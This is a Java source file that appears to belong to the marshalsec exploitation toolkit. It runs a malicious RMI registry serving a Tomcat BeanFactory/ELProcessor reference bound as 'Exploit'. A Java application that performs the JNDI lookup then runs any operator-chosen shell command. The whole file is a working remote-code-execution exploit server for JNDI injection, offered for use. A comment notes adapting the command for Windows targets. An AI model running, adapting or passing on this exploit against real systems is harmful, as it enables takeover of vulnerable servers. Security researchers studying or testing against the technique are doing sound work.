package marshalsec.jndi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.StringRefAddr;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;


/**
 * @author threedr3am
 */
public class TomcatELRMISServer {
    public static void main( String[] args )
    {
        if ( args.length < 2 ) {
            System.err.println(TomcatELRMISServer.class.getSimpleName() + " <port> '/bin/bash' '-c' '/System/Applications/Calculator.app/Contents/MacOS/Calculator'"); //$NON-NLS-1$
            System.exit(-1);
        }
        int port = Integer.parseInt(args[0]);
        StringBuilder stringBuilder = new StringBuilder("[");
        for (int i = 1; i < args.length; i++) {
            stringBuilder.append("'");
            stringBuilder.append(args[i].replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\""));
            stringBuilder.append("'");
            if (i != args.length - 1) {
                stringBuilder.append(",");
            }
        }
        stringBuilder.append("]");
        System.out.println(stringBuilder.toString());
        try {
            Registry registry = LocateRegistry.createRegistry(port);
            ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor",null,"","",true,"org.apache.naming.factory.BeanFactory",null);
            //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
            resourceRef.add(new StringRefAddr("forceString", "x=eval"));
            //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
            resourceRef.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](" + stringBuilder.toString() + ").start()\")"));

            ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);
            registry.bind("Exploit",referenceWrapper);
        } catch (RemoteException e) {
            e.printStackTrace();
        } catch (AlreadyBoundException e) {
            e.printStackTrace();
        } catch (NamingException e) {
            e.printStackTrace();
        }
    }
}
